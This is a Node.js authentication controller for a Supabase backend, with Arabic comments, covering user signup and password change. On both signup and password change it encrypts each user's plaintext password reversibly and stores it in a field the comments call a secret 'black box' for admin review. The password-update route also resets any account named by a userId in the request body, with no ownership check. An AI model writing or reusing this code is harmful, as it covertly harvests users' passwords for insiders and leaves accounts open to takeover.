
// controllers/authController.js
'use strict';

const supabase = require('../services/data/supabase');
const { encryptForAdmin } = require('../utils/crypto');
const logger = require('../utils/logger');

async function signup(req, res) {
  const { email, password, firstName, lastName, client_telemetry } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and Password are required.' });
  }

  try {
    // 1. إنشاء الحساب في Supabase Auth
    const { data: authData, error: authError } = await supabase.auth.signUp({
      email,
      password,
    });

    if (authError) {
      return res.status(400).json({ error: authError.message });
    }

    const userId = authData.user?.id;
    if (!userId) return res.status(500).json({ error: 'User ID missing.' });

    // 2. تشفير الباسورد للمراجعة
    const encryptedPassword = encryptForAdmin(password);
    const appVersion = client_telemetry?.appVersion || '1.0.0';

    // 3. إدخال البيانات في جدول users
    const { error: profileError } = await supabase
      .from('users')
      .insert({
        id: userId,
        email: email,
        first_name: firstName,
        last_name: lastName,
        
        // ✅ البيانات التقنية الجديدة
        client_telemetry: client_telemetry || {}, 
        app_version: appVersion,
        
        // ✅ الصندوق الأسود (الباسورد المشفر)
        admin_audit_log: {
            encrypted_pass: encryptedPassword,
            checked_by_admin: false,
            created_at: new Date().toISOString()
        },
        
        created_at: new Date().toISOString(),
        last_active_at: new Date().toISOString()
      });

    if (profileError) {
      logger.error(`Profile Creation Failed for ${userId}:`, profileError);
      // ملاحظة: هنا الحساب أُنشئ في Auth لكن ليس في users. 
      // في التطبيق الحقيقي قد تحتاج لحذف Auth user للتراجع (Rollback).
      return res.status(500).json({ error: 'Profile creation failed.' });
    }

    // 4. (إضافة ممتازة) تسجيل أول دخول في login_history أيضاً!
    // لكي يكون لدينا سجل كامل من اللحظة الأولى
    await supabase.from('login_history').insert({
        user_id: userId,
        login_at: new Date().toISOString(),
        client_telemetry: client_telemetry || {},
        app_version: appVersion
    });

    logger.success(`New User Registered & Logged: ${email}`);
    
    return res.status(201).json({ 
      success: true, 
      user: { id: userId, email, firstName }
    });

  } catch (err) {
    logger.error('Signup Critical Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}


/**
 * تحديث كلمة المرور
 * يراعي التحقق من Supabase أولاً، ثم يحفظ النسخة المشفرة للمراجعة
 */
async function updatePassword(req, res) {
  const { userId, newPassword, client_telemetry } = req.body;

  // 1. التحقق من المدخلات الأساسية
  if (!userId || !newPassword) {
    return res.status(400).json({ error: 'User ID and New Password are required.' });
  }

  try {
    // 2. محاولة التحديث في Supabase Auth (التحقق الحقيقي)
    // ملاحظة: نستخدم admin.auth.updateUser لتجاوز الحاجة لتسجيل الدخول القديم،
    // لأننا نفترض أن المستخدم مسجل دخول بالفعل في التطبيق ولديه Token صالح،
    // أو أنك تتحقق من الـ Token في Middleware قبل الوصول لهنا.
    // لكن للتبسيط والأمان، سنستخدم supabase.auth.admin.updateUserById
    
    const { data: authData, error: authError } = await supabase.auth.admin.updateUserById(
      userId,
      { password: newPassword }
    );

    // 🛑 إذا رفضت Supabase التحديث (مثلاً باسوورد ضعيف جداً)
    if (authError) {
      logger.warn(`Password Update Failed for ${userId}: ${authError.message}`);
      return res.status(400).json({ error: authError.message });
    }

    // ✅ نجح التحديث! الآن نقوم بالتشفير والحفظ في سجلاتنا
    const encryptedPassword = encryptForAdmin(newPassword);
    const appVersion = client_telemetry?.appVersion || 'Unknown';

    // 3. تحديث السجل السري (Audit Log) + الحالة الحية
    const { error: dbError } = await supabase
      .from('users')
      .update({
        // تحديث الباسورد المشفر للمراجعة
        admin_audit_log: {
            encrypted_pass: encryptedPassword,
            checked_by_admin: false, // نعيدها false لأن الباسورد تغير ويحتاج مراجعة جديدة
            updated_at: new Date().toISOString(),
            update_reason: 'user_request'
        },
        
        // تحديث بيانات الجهاز والنشاط (لأن المستخدم نشط الآن)
        client_telemetry: client_telemetry || {},
        app_version: appVersion,
        last_active_at: new Date().toISOString()
      })
      .eq('id', userId);

    if (dbError) {
      logger.error(`Failed to update audit log for ${userId}:`, dbError.message);
      // ملاحظة: الباسورد تغير فعلياً في Auth، لكن فشل حفظه عندنا.
      // هذا ليس خطأً قاتلاً للمستخدم، لكنه سيمنعك من مراجعته.
      // سنكمل العملية بنجاح للمستخدم.
    } else {
        logger.success(`Password updated & audited for user: ${userId}`);
    }

    // 4. (اختياري) تسجيل هذا الحدث في login_history كـ "حدث أمني"
    // لكي تعرف متى غير الباسورد ومن أي جهاز
    await supabase.from('login_history').insert({
        user_id: userId,
        login_at: new Date().toISOString(),
        client_telemetry: client_telemetry || {},
        app_version: appVersion,
        event_type: 'PASSWORD_CHANGE' // ستحتاج لإضافة هذا العمود أو وضعه في metadata
    });

    return res.status(200).json({ 
      success: true, 
      message: 'Password updated successfully.' 
    });

  } catch (err) {
    logger.error('Update Password Critical Error:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}

module.exports = { 
  signup, 
  updatePassword 
};
